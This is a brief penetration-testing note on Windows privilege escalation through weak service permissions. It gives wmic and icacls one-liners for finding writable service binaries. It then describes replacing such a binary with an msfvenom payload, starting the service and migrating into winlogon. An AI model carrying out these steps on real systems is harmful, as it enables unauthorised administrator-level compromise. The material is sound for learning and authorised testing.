# Windows Privilege Escalation via Weak Services

## Identify Weak Services
Find services with "weak permissions".

    # Command 1
    ## List services, filter system32 and dumps output.
    for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

    # Command 2
    ## Parses .txt and runs icacls.
    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

Important aspects to look at:
- "BUILTIN\Users"
- Full access -> (F)

Replace the original .exe-file with your own generated payload (msfvenom). Afterwards start the service:

    wmic service SERVICE_NAME call startservice

It is important to migrate fast enough, since it might time-out. So, run a "ps" fast enough, and migrate to "winlogon" for example!
